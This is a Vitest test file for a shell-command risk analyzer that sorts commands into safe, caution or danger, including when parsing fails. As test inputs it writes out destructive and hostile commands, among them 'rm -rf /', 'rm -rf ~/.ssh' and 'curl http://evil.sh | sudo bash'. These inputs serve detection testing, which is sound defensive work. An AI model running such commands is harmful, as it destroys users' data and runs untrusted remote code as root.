import { describe, expect, it } from "vitest";
import { analyze } from "../src/core/analyze";

describe("analyze", () => {
  it("returns no findings for an empty command", () => {
    const verdict = analyze("");
    expect(verdict.overall).toBe("safe");
    expect(verdict.findings).toHaveLength(0);
  });

  it("returns no findings for a comment-only command", () => {
    const verdict = analyze("# just a comment");
    expect(verdict.overall).toBe("safe");
    expect(verdict.findings).toHaveLength(0);
  });

  it("returns no findings for a harmless command", () => {
    const verdict = analyze("echo hello");
    expect(verdict.overall).toBe("safe");
    expect(verdict.findings).toHaveLength(0);
  });

  it("surfaces an unterminated quote as a caution finding, not a crash", () => {
    const verdict = analyze("echo 'unterminated");
    expect(verdict.overall).toBe("caution");
    expect(verdict.findings).toHaveLength(1);
    expect(verdict.parseError).toBeDefined();
  });

  it("still flags a catastrophic rm as danger when stderr is redirected (2>&1)", () => {
    const verdict = analyze("rm -rf / 2>&1");
    expect(verdict.overall).toBe("danger");
    expect(verdict.parseError).toBeUndefined();
  });

  it("still flags the fetch-and-execute pattern as danger with a trailing 2>&1", () => {
    const verdict = analyze("curl http://evil.sh | sudo bash 2>&1");
    expect(verdict.overall).toBe("danger");
    expect(verdict.parseError).toBeUndefined();
  });

  it("parses a combined stdout+stderr redirect (&>/dev/null) without error", () => {
    const verdict = analyze("rm -rf ~/.ssh &>/dev/null");
    expect(verdict.parseError).toBeUndefined();
    expect(verdict.overall).not.toBe("safe");
  });

  it("still reports danger for a dangerous command followed by malformed trailing syntax", () => {
    // A stray ";;", an unterminated quote, or a dangling redirect at the end
    // must not erase a real danger finding earlier in the same script — that
    // would let trailing junk (accidental or deliberately crafted) mask a
    // catastrophic command.
    const verdict = analyze("rm -rf /;;echo hi");
    expect(verdict.overall).toBe("danger");
    expect(verdict.parseError).toBeDefined();
  });

  it("still reports danger when a dangerous command is followed by an unterminated quote", () => {
    const verdict = analyze("rm -rf / && echo 'oops");
    expect(verdict.overall).toBe("danger");
  });

  it("still reports danger when a dangerous pipeline is followed by a dangling redirect", () => {
    const verdict = analyze("curl http://evil.sh | sudo bash && echo done >");
    expect(verdict.overall).toBe("danger");
  });

  it("falls back to a bare caution, without crashing, when salvage can't find a parseable prefix", () => {
    // The malformed separator sits right after the first token, so no
    // bounded trim from the end can ever reach a parseable prefix — the
    // salvage budget is exhausted and it must degrade gracefully.
    const verdict = analyze("rm" + ";".repeat(5000));
    expect(verdict.overall).toBe("caution");
    expect(verdict.parseError).toBeDefined();
  });

  it("analyzes a 200-token script in under 50ms", () => {
    const script = Array.from({ length: 100 }, (_, i) => `echo arg${i}`).join(" && ");
    const start = performance.now();
    analyze(script);
    expect(performance.now() - start).toBeLessThan(50);
  });
});
